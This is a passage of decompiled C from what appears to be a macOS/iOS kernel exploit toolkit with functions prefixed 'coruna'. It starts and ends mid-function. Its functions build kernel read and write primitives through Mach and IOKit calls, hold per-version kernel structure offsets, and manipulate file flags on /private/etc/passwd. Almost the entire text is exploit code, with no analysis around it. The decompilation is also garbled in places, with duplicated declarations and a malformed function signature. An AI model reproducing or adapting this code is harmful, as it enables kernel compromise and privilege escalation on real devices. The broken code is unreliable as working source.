        status = status + 8 + tag;
        buf = buf + 2;
        port = port - 1;
      } while (port != 0);
    }
    err = *(uint *)(handle + 0x5c) - version;
    flags = err * 8;
    if (*(uint *)(handle + 0x5c) < version || err == 0) {
      flags = 0;
    }
    version = flags + status;
    flags = flags + 0xc;
  }
  port = (unsigned long)version;
  ptr = _malloc(port);
  size = 0;
  if (ptr != (uint32_t *)0x0) {
    _bzero(ptr,port);
    if (*(int *)(handle + 0x30) == 1) {
      buf = *(uint **)(handle + 0x38);
      *ptr = 0xc00cdefa;
      tag = (*buf & 0xff00ff00) >> 8 | (*buf & 0xff00ff) << 8;
      version = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
      ptr[1] = version >> 0x10 | version << 0x10;
      ptr[2] = tag >> 0x10 | tag << 0x10;
      if (*buf != 0) {
        addr = 0;
        kind = 0;
        handle = *(long *)(buf + 2);
        copy = ptr + 4;
        version = flags + *buf * 8;
        do {
          flags = *(int *)(handle + addr);
          if (flags == *(int *)(handle + 0x40)) {
            *size = version;
            flags = *(int *)(handle + addr);
          }
          str = flags_2;
          if ((flags == 5) || (str = count_3, flags == 7)) {
            *str = version;
          }
          tag = *(uint *)(handle + addr);
          tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
          u = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
          copy[-1] = tag >> 0x10 | tag << 0x10;
          *copy = u >> 0x10 | u << 0x10;
          ptr = *(void **)((uint *)(handle + addr) + 2);
          tag = *(uint *)((long)ptr + 4);
          tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
          u = tag >> 0x10 | tag << 0x10;
          _memcpy((void *)((long)ptr + (unsigned long)version),ptr,(unsigned long)u);
          handle = *(long *)(buf + 2);
          tag = type_id;
          if (type_id == 0 || *(int *)(handle + addr) != 5) {
            tag = u;
          }
          version = tag + version;
          kind = kind + 1;
          addr = addr + 0x10;
          copy = copy + 2;
        } while (kind < *buf);
      }
      *val = ptr;
      *arg = port;
      size = 1;
    }
    else {
      version = *(uint *)((long)*(void **)(handle + 0x38) + 4);
      version = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
      _memcpy(ptr,*(void **)(handle + 0x38),(unsigned long)(version >> 0x10 | version << 0x10));
      *val = ptr;
      *arg = port;
      size = 1;
      *size = 0;
    }
  }
  return size;
}





uint64_t coruna_read_etc_passwd(long handle,long addr_2,long *off_3,long *ctx_4,int *flags)
{
  int err;
  int status;
  int flags;
  long handle;
  uint64_t u;
  long addr;
  long off;
  long base;
  uint32_t scratch;
  uint32_t bootargs;
  uint32_t thread_attr;
  uint host_info;
  long serial_buf;
  unsigned long action;
  long block_ctx;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    block_ctx = 0;
    action = action & 0xffffffff00000000;
    err = *(int *)(handle + 0x140);
    if (err < 0x1f53) {
      if (err != 0x1809 && err != 0x1c1b) {
        return 0;
      }
    }
    else if (1 < err - 0x1f53U && err != 0x2258) {
      return 0;
    }
    err = _open("/dev/null",0);
    if (-1 < err) {
      status = _fileport_makeport(err,&action);
      if (status == 0) {
        off = coruna_kernel6544_via_return_zero_2b000(handle,action & 0xffffffff);
        if (off != 0) {
          off = off + 0x38;
          status = coruna_kernel6544_residual_256(handle,off,&block_ctx);
          if ((status != 0) && (status = coruna_call_mach_vm_machine_attribute_29df8(handle,off,addr_2), status != 0)) {
            *flags = err;
            *off_3 = off;
            *ctx_4 = block_ctx;
            _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,
                               (mach_port_name_t)action);
            return 1;
          }
        }
        _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)action)
        ;
      }
      _close(err);
    }
    u = 0;
  }
  else {
    off = 0;
    *off_3 = 0;
    *ctx_4 = 0;
    action = 0;
    block_ctx = 0;
    serial_buf = 0;
    thread_attr = 0xffffffff;
    host_info = 0xffffffff;
    scratch = 0xffffffff;
    bootargs = 0xffffffff;
    err = *(int *)(handle + 0x140);
    base = 0x48;
    if (err < 0x2258) {
      addr = 0;
      if ((1 < err - 0x1f53U && err != 0x1809) && err != 0x1c1b) {
        return 0;
      }
    }
    else {
      addr = 0;
      if (err != 0x2258) {
        if ((err != 0x2712) && (err != 0x225c)) {
          return 0;
        }
        addr = 0x74;
        off = 0x40;
        base = 0x50;
      }
    }
    err = _open("/private/etc/passwd",0);
    if (-1 < err) {
fail:
      status = coruna_kernel6544_via_ptr_canonicalize_8(handle,err,&block_ctx);
      if ((status == 0) && (status = coruna_kernel6544_via_fcntl_1bf84(handle,block_ctx + 0x54,&host_info), status != 0)) {
        if ((host_info >> 0xe & 1) == 0) {
          status = coruna_mach_vm_machine_attribute(handle,block_ctx + 0x54,host_info | 0x4000);
          if (status == 0) goto done;
          _close(err);
          err = _open("/private/etc/passwd",0);
          if (err < 0) goto cleanup;
          goto fail;
        }
        status = coruna_kernel6544_residual_256(handle,block_ctx + 0x40,&serial_buf);
        if ((((((status != 0) && (handle = coruna_ptr_canonicalize(handle,serial_buf), handle != 0)) &&
              (status = coruna_kernel6544_residual_256(handle,serial_buf + base,&action), status != 0)) &&
             (handle = coruna_ptr_canonicalize(handle,action), handle != 0)) &&
            ((*(int *)(handle + 0x140) < 0x225c ||
             (((status = coruna_kernel6544_via_fcntl_1bf84(handle,block_ctx + addr,&bootargs), status != 0 &&
               (status = coruna_kernel6544_via_fcntl_1bf84(handle,serial_buf + off,&scratch), status != 0)) &&
              ((status = coruna_kernel6544_via_fcntl_1bf84(handle,addr + addr_2,&thread_attr), status != 0 &&
               ((status = coruna_mach_vm_machine_attribute(handle,serial_buf + off,thread_attr), status != 0 &&
                (status = coruna_mach_vm_machine_attribute(handle,block_ctx + addr,thread_attr), status != 0)))))))))) &&
           (status = coruna_call_mach_vm_machine_attribute_29df8(handle,serial_buf + base,addr_2), status != 0)) {
          status = _open("/private/etc/passwd",0);
          flags = coruna_call_mach_vm_machine_attribute_29df8(handle,serial_buf + base,action);
          if ((flags == 0) ||
             (((0x225b < *(int *)(handle + 0x140) &&
               ((flags = coruna_mach_vm_machine_attribute(handle,block_ctx + addr,bootargs), flags == 0 ||
                (flags = coruna_mach_vm_machine_attribute(handle,serial_buf + off,scratch), flags == 0)))) ||
              (status < 0)))) {
            if (status == -1) goto done;
          }
          else {
            flags = coruna_kernel6544_via_ptr_canonicalize_8(handle,status,&block_ctx);
            if ((flags == 0) && (block_ctx == addr_2)) {
              *flags = status;
              u = 1;
              goto check_ok;
            }
          }
          _close(status);
        }
      }
done:
      u = 0;
      goto check_ok;
    }
cleanup:
    u = 0;
    if (err != -1) {
check_ok:
      _close(err);
    }
  }
  return u;
}





void coruna_kernel6544_via_wire_map_lookup_3(long handle,void *ctx)
{
  uint u;
  long handle;
  uint64_t size;
  uint scratch;
  uint8_t bootargs[48];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_wire_map_lookup(handle,*(uint32_t *)(handle + 0x40),0xfade0c02);
  size = 0;
  if (handle != 0) {
    scratch = 0x30;
    u = (*(uint *)(handle + 4) & 0xff00ff00) >> 8 | (*(uint *)(handle + 4) & 0xff00ff) << 8;
    size = coruna_sha1_sha256(*(uint8_t *)(handle + 0x25),handle,u >> 0x10 | u << 0x10,
                         bootargs,&scratch);
    if ((int)size != 0) {
      _memcpy(ctx,bootargs,(unsigned long)scratch);
      size = 1;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(size);
}





uint64_t
void coruna_kernel6544_via_kernel6544_via_vm_deallocate_f7f8(uint64_t val,uint64_t id_2,unsigned long arg,uint64_t size_3,
            uint64_t off_4)
{
  uint64_t u;
  long scratch;
  
  u = coruna_kernel6544_residual_256(val,id_2,&scratch);
  if ((int)u != 0) {
    do {
      u = coruna_kernel6544_via_vm_deallocate_f7f8(val,scratch + (arg & 0xffffffff),size_3,off_4);
      if ((int)u == 0) {
        return u;
      }
      u = coruna_kernel6544_residual_256(val,scratch,&scratch);
      if ((int)u == 0) {
        return u;
      }
    } while (scratch != 0);
    u = 1;
  }
  return u;
}





uint32_t coruna_kernel6544_via_ctx_test_flag_10(long handle)
{
  int err;
  int status;
  uint32_t u;
  uint32_t size;
  
  status = coruna_ctx_test_flag(handle,0x5184001);
  err = *(int *)(handle + 0x140);
  if (err - 0x1f53U < 2) {
    size = 0xd0;
    if (status != 0) {
      size = 0xd8;
    }
    u = 0xc0;
    if (status != 0) {
      u = 200;
    }
    if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
      size = u;
    }
  }
  else if (err == 0x1c1b) {
    u = 0xb0;
    size = 0xa8;
    if (status != 0) {
      u = 0xb8;
      size = 0xb0;
    }
    if (0x1c1b19145fffff < *(unsigned long *)(handle + 0x158)) {
      size = u;
    }
  }
  else {
    u = 0xb0;
    if (status != 0) {
      u = 0xb8;
    }
    size = 0;
    if (err == 0x1809) {
      size = u;
    }
  }
  return size;
}





uint coruna_open_usr_lib_dyld(long handle)
{
  int err;
  int status;
  uint u;
  int *err;
  uint *ptr;
  uint size;
  uint32_t scratch;
  unsigned long bootargs;
  uint32_t *thread_attr;
  uint64_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  bootargs = (unsigned long)(0x20000000 - *(int *)(handle + 0x180));
  thread_attr = &scratch;
  host_info = 4;
  err = _open("/usr/lib/dyld",0);
  if (err < 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    size = -*ptr;
    if (-1 < err) {
      size = *ptr;
    }
    size = size | 0x40000000;
  }
  else {
    status = _fcntl(err,0x3b);
    if ((status == 0) || (err = ___error(), *err != 0x55)) {
      size = 0x1001;
    }
    else {
      size = 0;
    }
    u = _close(err);
    ptr = (uint *)(unsigned long)u;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return size;
  }
  ___stack_chk_fail(ptr);
}





uint64_t coruna_iokit_msg_free(uint8_t *buf)
{
  uint u;
  
  *buf = 1;
  do {
    u = **(uint **)(buf + 0x18);
    if ((u >> 0x1a & 1) != 0) {
      **(uint **)(buf + 0x18) = u & 0xfbffffff;
      DataSynchronizationBarrier(2,3,0);
      return 0;
    }
  } while (buf[1] == '\0');
  return 0;
}





uint64_t coruna_fcntl_273d4(long handle,int *flags)
{
  int err;
  int *err;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint8_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  unsigned long sa_saved;
  uint64_t *sa_new;
  uint64_t path_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  stack_guard = 0;
  block_ctx = 0;
  block_ctx = 0;
  action = 0;
  action = 0;
  serial_buf = 0;
  serial_buf = 0;
  host_info = 0;
  host_info = 0;
  scratch = k_kernel_rodata_word_3b7c0;
  bootargs = 0x20200;
  _uStack_a0 = coruna_cat((char)*(uint32_t *)k_kernel_vm_page_shift_slot,0x22000000000);
  scratch = 0;
  thread_attr = 0;
  sa_saved = (unsigned long)(0x20000000 - *(int *)(handle + 0x180));
  sa_new = &scratch;
  path_buf = 0x70;
  err = _fcntl(*flags,0x3b);
  if ((err != 0) && (err = ___error(), *err == 1)) {
    ___error();
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == tmp_buf) {
    return 0;
  }
  ___stack_chk_fail();
}





uint64_t coruna_mach_thread_self(long handle)
{
  int err;
  mach_port_t lm2;
  mach_port_t lm3;
  uint u;
  uint64_t size;
  uint scratch;
  
  size = 0x2801f;
  *(uint64_t *)(&UNK_000018c0 + handle) = 0;
  *(uint64_t *)(&k_kernel_slot_18b8 + handle) = 0;
  coruna_mach_absolute_time();
  err = coruna_ctx_test_flag(handle,0x400);
  if (err != 0) {
    scratch = 0;
    err = coruna_msu_statfs_probe(handle,&scratch);
    if (err == 0) {
      return 0x28020;
    }
    if (scratch != 3) {
      u = *(uint *)(handle + 600);
      if (1 < u) {
        if (u != 3) {
          return 0x28020;
        }
        u = 0;
      }
      if ((scratch != u) && (err = coruna_chown_rmdir(handle), err == 0)) {
        return 0x28020;
      }
    }
  }
  err = coruna_ctx_test_flag(handle,4);
  if (((err == 0) || (err = coruna_kernel6544_via_ctx_test_flag_2(handle,0), err != 0)) &&
     ((*(long *)(&k_kernel_slot_1900 + handle) == 0 ||
      (err = coruna_task_info_249e8(handle,*(uint32_t *)k_kernel_mach_task_self_slot,2,
                            &k_kernel_slot_1908 + handle,8), err != 0)))) {
    lm3 = *(mach_port_t *)(&k_kernel_slot_192c + handle);
    if ((1 < lm3 + 1) && (lm2 = _mach_thread_self(), lm3 == lm2)) {
      lm3 = _mach_thread_self();
      err = coruna_kernel6544_via_kernel6544_via_ioconnectcallmethod_9(handle,lm3,0);
      if (err == 0) {
        return 0x2801f;
      }
    }
    if (((*(int *)(&k_kernel_slot_1910 + handle) == 0 && *(int *)(&k_kernel_slot_1914 + handle) == 0) ||
        (err = coruna_getuid(handle,*(int *)(&k_kernel_slot_1910 + handle),
                              *(int *)(&k_kernel_slot_1914 + handle),0), err != 0)) &&
       ((lm3 = _mach_host_self(), lm3 == *(mach_port_t *)(&k_kernel_slot_1928 + handle) ||
        ((err = coruna_ctx_test_flag(handle,0x10), err != 0 ||
         (err = coruna_task_get_special_port_24e04(handle,*(uint32_t *)k_kernel_mach_task_self_slot,
                               *(uint32_t *)(&k_kernel_slot_1928 + handle)), err != 0)))))) {
      coruna_kernel6544_via_vm_allocate(handle);
      size = 0;
    }
  }
  return size;
}





void coruna_kernel6544_via_mach_port_request_notification(long handle,uint *size)
{
  uint u;
  uint size;
  int err;
  uint version;
  void (*ptr)(void);
  int status;
  long handle;
  unsigned long unaff_x30;
  
  status = coruna_ctx_test_flag(handle,0x5184001);
  if (status != 0) {
    u = *size;
    if (0x1ff8 < u) {
      size = *(uint *)(handle + 0x180);
      version = 0;
      if (size != 0) {
        version = u / size;
      }
      err = u - version * size;
      status = 0;
      if (err != 0) {
        status = size - err;
      }
      handle = coruna_mach_port_destroy(handle,status + u);
      if (handle != 0) {
        *size = status + u;
      }
      return;
    }
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_mach_port_request_notification(handle,size);
  return;
}





void coruna_kernel09_via_bzero_2(uint *size)
{
  void (*ptr)(void);
  unsigned long u;
  long handle;
  unsigned long unaff_x30;
  
  if (*size != 0) {
    u = 0;
    handle = 8;
    do {
      coruna_bzero(*(uint64_t *)(*(long *)(size + 2) + handle));
      u = u + 1;
      handle = handle + 0x10;
    } while (u < *size);
  }
  _free(*(void **)(size + 2));
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  _free(size);
  return;
}





uint coruna_iokit_msg_append(uint *size,uint32_t size_x,uint64_t val)
{
  uint32_t *ptr;
  void *ptr;
  uint u;
  
  u = *size;
  if (u < size[1]) {
    ptr = *(void **)(size + 2);
  }
  else {
    u = size[1] << 1;
    ptr = _realloc(*(void **)(size + 2),(unsigned long)u << 4);
    if (ptr == (void *)0x0) {
      return 0xffffffff;
    }
    size[1] = u;
    *(void **)(size + 2) = ptr;
    u = *size;
  }
  ptr = (uint32_t *)((long)ptr + (unsigned long)u * 0x10);
  *ptr = size_x;
  *(uint64_t *)(ptr + 2) = val;
  *size = u + 1;
  return u + 1;
}





uint64_t * coruna_malloc(void)
{
  uint64_t *ptr;
  void *ptr;
  
  ptr = _malloc(0x10);
  if (ptr != (uint64_t *)0x0) {
    ptr = _malloc(0x40);
    if (ptr == (void *)0x0) {
      _free(ptr);
      ptr = (uint64_t *)0x0;
    }
    else {
      ptr[1] = ptr;
      *ptr = k_kernel_rodata_word_3b7c8;
    }
  }
  return ptr;
}





uint coruna_pread(int flags,long handle,unsigned long arg,long addr_2)
{
  int err;
  bool err;
  unsigned long u;
  int *err;
  uint *ptr;
  unsigned long size;
  uint version;
  
  if (arg != 0) {
    size = 0;
    do {
      version = 0;
      while (u = _pread(flags,(void *)(handle + size),arg - size,size + addr_2),
            u == 0xffffffffffffffff) {
        err = ___error();
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        version = -*ptr;
        if (-1 < err) {
        version = *ptr;
        }
        return version | 0x40000000;
      }
      if ((long)u < 0) {
fail:
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        version = -*ptr;
        if (-1 < err) {
          version = *ptr;
        }
        return version | 0x40000000;
      }
      if (arg < u) {
        return 0xad014;
      }
      err = CARRY8(u,size);
      size = u + size;
      if (err) {
        return 0xad014;
      }
      if (arg < size) {
        return 0xad014;
      }
    } while (size < arg);
  }
  return 0;
}





long coruna_return_zero_2af7c(long handle,long addr_2)
{
  int err;
  bool err;
  long handle;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809 || err == 0x1c1b) {
      handle = 0x68;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x58;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x48;
  }
  return handle + addr_2;
}





long coruna_return_zero_2b000(long handle,uint64_t val)
{
  int err;
  long handle;
  uint8_t scratch;
  byte scratch;
  long bootargs;
  
  err = coruna_kernel6544_via_fcntl_1bf84(handle,val,&scratch);
  if (err != 0) {
    handle = coruna_return_zero_2af7c(handle,val);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel6544_residual_256(handle,handle,&bootargs);
    if (err != 0) {
      handle = coruna_ptr_canonicalize(handle,bootargs);
      if (handle == 0) {
        return 0;
      }
      if ((*(unsigned long *)(handle + 0x158) < 0x1f530000000000) && ((scratch >> 2 & 1) != 0)) {
        err = coruna_kernel6544_residual_256(handle,bootargs + *(int *)(handle + 0x168),&bootargs);
        if (err == 0) {
          return 0;
        }
        handle = coruna_ptr_canonicalize(handle,bootargs);
        if (handle == 0) {
          return 0;
        }
      }
      return bootargs;
    }
  }
  return 0;
}





long coruna_return_zero_2b0c0(long handle,long addr_2)
{
  int err;
  bool err;
  int status;
  long handle;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      handle = 0x90;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
        handle = 0x98;
      }
    }
    else if (err == 0x1c1b) {
      handle = 0x90;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x80;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x70;
  }
  return handle + addr_2;
}





long coruna_return_zero_2b16c(long handle,long addr_2)
{
  int err;
  bool err;
  int status;
  long handle;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      handle = 0xa0;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
        handle = 0xa8;
      }
    }
    else if (err == 0x1c1b) {
      handle = 0xa0;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x90;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x80;
  }
  return handle + addr_2;
}





mach_port_t coruna_processor_set_info(long handle)
{
  void (*ptr)(void);
  uid_t u;
  mach_port_t lm3;
  kern_return_t lk4;
  unsigned long unaff_x30;
  mach_msg_type_number_t scratch;
  integer_t bootargs [2];
  host_t thread_attr;
  processor_set_name_t host_info;
  
  thread_attr = 0;
  scratch = 2;
  if ((*(char *)(handle + 10) != '\0') && (u = _getuid(), u != 0)) {
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
      lm3 = _mach_host_self();
      return lm3;
    }
    ___stack_chk_fail();
}
  lm3 = _mach_host_self();
  lk4 = _processor_set_default(lm3,&host_info);
  if (lk4 == 0) {
    lk4 = _processor_set_info(host_info,5,&thread_attr,bootargs,&scratch);
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,host_info);
  }
  if (lk4 == 0x35) {
    thread_attr = _mach_host_self();
  }
  return thread_attr;
}





int coruna_return_zero_2b2d0(long handle)
{
  bool err;
  int err;
  int status;
  
  err = *(int *)(handle + 0x174);
  if (err == 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x1f54) {
      if (err == 0x1809) {
        err = 0xa8;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
          err = 0xb0;
        }
      }
      else if (err == 0x1c1b) {
        err = 0xa8;
      }
      else {
        if (err != 0x1f53) {
          return 0;
        }
        err = 0xa0;
      }
    }
    else {
      if (err < 0x225c) {
        err = err == 0x1f54;
        status = 0x2258;
      }
      else {
        err = err == 0x225c;
        status = 0x2712;
      }
      if (!err && err != status) {
        return 0;
      }
      err = 0x90;
    }
    *(int *)(handle + 0x174) = err;
  }
  return err;
}





void coruna_kernel6544_via_return_zero_2b000(long handle,uint64_t val)
{
  int err;
  void (*ptr)(void);
  long handle;
  int status;
  unsigned long unaff_x30;
  
  err = *(int *)k_kernel_mach_task_self_slot;
  status = (int)val;
  if ((err != status) || (*(long *)(handle + 0x1b0) == 0)) {
    if (status == -1) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      coruna_kernel6544_via_kernel6544_via_return_zero_2b000(handle);
      return;
    }
    handle = coruna_kernel6544_via_return_zero_2c0bc(handle,err,val);
    if (((handle != 0) && (handle = coruna_return_zero_2b000(handle,handle), err == status && handle != 0)) &&
       (*(long *)(handle + 0x1b0) == 0)) {
      *(long *)(handle + 0x1b0) = handle;
    }
  }
  return;
}





long coruna_kernel6544_via_kernel6544_via_return_zero_2b000(long handle)
{
  long handle;
  
  handle = *(long *)(&k_kernel_slot_19d8 + handle);
  if (handle == 0) {
    if (*(long *)(&k_kernel_slot_19d0 + handle) != 0) {
      handle = coruna_return_zero_2b000();
      return handle;
    }
    if (*(int *)(&k_kernel_slot_191c + handle) != -1) {
      if (*(int *)(&k_kernel_slot_191c + handle) != 0) {
fail:
        handle = coruna_kernel6544_via_return_zero_2b000();
        return handle;
      }
      handle = coruna_kernel6544_via_return_zero_2b000();
      return handle;
    }
    handle = 0;
  }
  return handle;
}





void coruna_ret_stub_3(uint64_t val,uint64_t id_2)
{
  coruna_kernel6544_via_return_zero_2c0bc(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  return;
}





uint64_t coruna_return_zero_2b488(long handle,long addr_2)
{
  bool err;
  bool status;
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      err = 0x1f530f027ffffe < *(unsigned long *)(handle + 0x158);
      status = *(unsigned long *)(handle + 0x158) == 0x1f530f027fffff;
      handle = 0x308;
    }
    else {
      if (err == 0x1809) {
        handle = 800;
        err = coruna_kernel6544_residual_256(handle,handle + addr_2,&scratch);
        if (err == 0) {
        u = 0;
        }
        else {
        handle = coruna_ptr_canonicalize(handle,scratch);
        u = 0;
        if (handle != 0) {
        u = scratch;
        }
        }
        return u;
      }
      if (err != 0x1c1b) {
        return 0;
      }
      err = 0x1c1b19145ffffe < *(unsigned long *)(handle + 0x158);
      status = *(unsigned long *)(handle + 0x158) == 0x1c1b19145fffff;
      handle = 0x338;
    }
    if (!err || status) {
      handle = 0x330;
    }
  }
  else {
    if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
      return 0;
    }
    handle = 0x300;
  }
fail:
  err = coruna_kernel6544_residual_256(handle,handle + addr_2,&scratch);
  if (err == 0) {
    u = 0;
  }
  else {
    handle = coruna_ptr_canonicalize(handle,scratch);
    u = 0;
    if (handle != 0) {
      u = scratch;
    }
  }
  return u;
}





uint32_t coruna_iosurface_field_read(long handle)
{
  int err;
  uint32_t u;
  
  u = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      u = 0x2c0;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x2e8;
      }
      return u;
    }
    if (err == 0x1809) {
      return 0x2d0;
    }
    if (err == 0x1c1b) {
      return 0x2e0;
    }
  }
  else if ((err == 0x2258 || err == 0x225c) || err == 0x2712) {
    u = 0x2b8;
  }
  return u;
}





uint32_t coruna_return_zero_2b624(long handle)
{
  bool err;
  bool status;
  int err;
  uint32_t u;
  uint32_t size;
  unsigned long version;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err == 0x1809) {
        err = coruna_ctx_test_flag(handle,0x5584001);
        if (err == 0) {
          return 0x380;
        }
        return 0x388;
      }
      if (err != 0x1c1b) {
        return 0;
      }
      version = *(unsigned long *)(handle + 0x158);
      err = coruna_ctx_test_flag(handle,0x5584001);
      u = 0x390;
      if (err != 0) {
        u = 0x3a0;
      }
      size = 0x398;
      if (err != 0) {
        size = 0x3b0;
      }
      if (version < 0x1c1b1914600000) {
        return u;
      }
      return size;
    }
    err = coruna_ctx_test_flag(handle,0x100000);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5584001);
      u = 0x378;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x3a0;
      }
      size = 0x390;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        size = 0x3b8;
      }
      if (err == 0) {
        return u;
      }
      return size;
    }
    err = 0x1f530f027ffffe < *(unsigned long *)(handle + 0x158);
    status = *(unsigned long *)(handle + 0x158) == 0x1f530f027fffff;
    size = 0x3c8;
    u = 0x3a0;
  }
  else {
    if (err != 0x2258) {
      if (err != 0x225c && err != 0x2712) {
        return 0;
      }
      return 0x730;
    }
    err = 0x22580f032ffffe < *(unsigned long *)(handle + 0x158);
    status = *(unsigned long *)(handle + 0x158) == 0x22580f032fffff;
    size = 0x530;
    u = 0x538;
  }
  if (!err || status) {
    u = size;
  }
  return u;
}





int coruna_return_zero_2b7a0(long handle)
{
  int err;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    if (err - 0x1f53U < 2) {
      if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
        err = coruna_return_zero_2b624(handle);
        return err + 8;
      }
      return 0;
    }
    if (err != 0x2258) {
      return 0;
    }
  }
  else if (err != 0x225c && err != 0x2712) {
    return 0;
  }
  err = coruna_ctx_test_flag(handle,0x5100000);
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x5584001);
    status = 0x370;
    if (err != 0) {
      status = 0x388;
    }
  }
  else {
    status = 0x3a0;
  }
  return status;
}





uint32_t coruna_return_zero_2b870(long handle)
{
  int err;
  uint32_t u;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    if (1 < err - 0x1f53U && err != 0x2258) {
      return 0;
    }
  }
  else if (err != 0x2712 && err != 0x225c) {
    return 0;
  }
  u = 0x28;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = 0;
  }
  return u;
}





uint32_t coruna_return_zero_2b8d8(long handle)
{
  int err;
  uint32_t u;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    if (1 < err - 0x1f53U && err != 0x2258) {
      return 0;
    }
  }
  else if (err != 0x2712 && err != 0x225c) {
    return 0;
  }
  u = 0x70;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = 0;
  }
  return u;
}





unsigned long coruna_kernel6544_via_return_zero_2b8d8(long arg)

{
  unsigned long type_id_13;
  
  type_id_13 = coruna_return_zero_2b8d8();
  if ((int)type_id_13 != 0) {
    type_id_13 = (unsigned long)(uint)((int)type_id_13 - *(int *)(arg + 0x168));
  }
  return type_id_13;
}





long coruna_return_zero_2b970(long handle,uint64_t val)
{
  int err;
  uint u;
  long handle;
  long addr;
  
  if (*(int *)(handle + 0x140) < 0x2258) {
    u = coruna_return_zero_2b624();
    if (u == 0) {
      return 0;
    }
  }
  else {
    err = coruna_return_zero_2b7a0();
    if (err == 0) {
      return 0;
    }
    u = err - *(int *)(handle + 0x168);
  }
  handle = coruna_kernel6544_via_return_zero_2b000(handle,val);
  addr = 0;
  if (handle != 0) {
    addr = handle + (unsigned long)u +
            ((long)*(int *)(handle + 0x168) << (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)));
  }
  return addr;
}





long coruna_return_zero_2ba0c(long handle,long addr_2)
{
  uint u;
  int err;
  long handle;
  long scratch;
  
  u = coruna_return_zero_2b624();
  if (u != 0) {
    if (0x2257 < *(int *)(handle + 0x140)) {
      return addr_2 - (unsigned long)u;
    }
    err = coruna_kernel6544_residual_256(handle,(unsigned long)u + addr_2,&scratch);
    if ((err != 0) && (scratch != 0)) {
      handle = coruna_ptr_canonicalize(handle);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





uint32_t coruna_return_zero_2ba94(long handle)
{
  int err;
  uint32_t u;
  
  err = *(int *)(handle + 0x140);
  u = 0x28;
  if (err < 0x2258) {
